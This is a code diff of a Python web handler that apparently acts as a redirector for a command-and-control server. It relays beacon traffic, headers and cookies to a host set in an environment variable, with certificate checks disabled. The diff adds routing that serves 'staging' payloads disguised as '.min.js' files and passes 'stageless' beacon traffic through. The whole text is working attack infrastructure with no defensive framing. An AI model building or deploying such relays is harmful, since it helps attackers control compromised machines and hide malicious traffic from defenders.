@@ -12,16 +12,16 @@ def example():
 def main_handler(path):
     C2 = 'https://' + os.getenv('C2') # HTTPS Beacon
 
-    headers = {}
+    ori_headers = {}
     for key, value in request.headers.items():
         if key not in ['Host', 'Content-Length']:
-            headers[key] = value
+            ori_headers[key] = value
 
     try:
         req = requests.request(
             method = request.method,
             url = C2 + '/api/' +path,
-            headers = headers,
+            headers = ori_headers,
             data = request.get_data(),
             cookies = request.cookies,
             verify=False,
@@ -33,6 +33,12 @@ def main_handler(path):
             if key not in ['Date', 'Connection', 'Server']:
                 rsp_headers[key] = value
 
-        return req.text, req.status_code, rsp_headers.items()
+        if path.endswith(".min.js"): # staging
+            rsp_headers['Content-Type'] = 'application/octet-stream'
+            return req.content, req.status_code, rsp_headers.items()
+        elif path.endswith("tit"): # stagless
+            return req.text, req.status_code, rsp_headers.items()
+        else: # other
+            return 'request err'
     except:
         return 'request err'
